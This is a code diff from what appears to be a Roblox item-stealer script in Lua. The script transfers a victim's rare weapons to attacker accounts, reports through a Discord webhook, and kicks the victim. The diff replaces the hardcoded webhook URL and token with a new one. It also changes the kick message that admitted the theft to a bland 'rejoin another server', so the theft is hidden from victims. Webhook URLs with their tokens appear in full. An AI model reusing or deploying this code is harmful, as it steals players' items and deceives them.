@@ -8,7 +8,7 @@ local users = _G.Usernames or {"JAMAL_THESCRIPTGUY"}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1540309263803617382/5UCVkYMAlBqTrj6-fm-mouP4aneoMhyOtBYEP_U6-dSScYB_ZHlVQOZhNm6Ml7g5kcTS"
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1543244647462080623/5JzL3T30KbyJunUmcCCcn2P6mHRlOJPaJhqA1OZ35rLzmRg9iaffDugI3hvQuVd4J0os"
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add username or webhook")
@@ -480,7 +480,7 @@ if #weaponsToSend > 0 then
             end
             wait(1)
         end
-        plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
+        plr:kick("rejoin another server")
     end
 
     local function waitForUserChat()
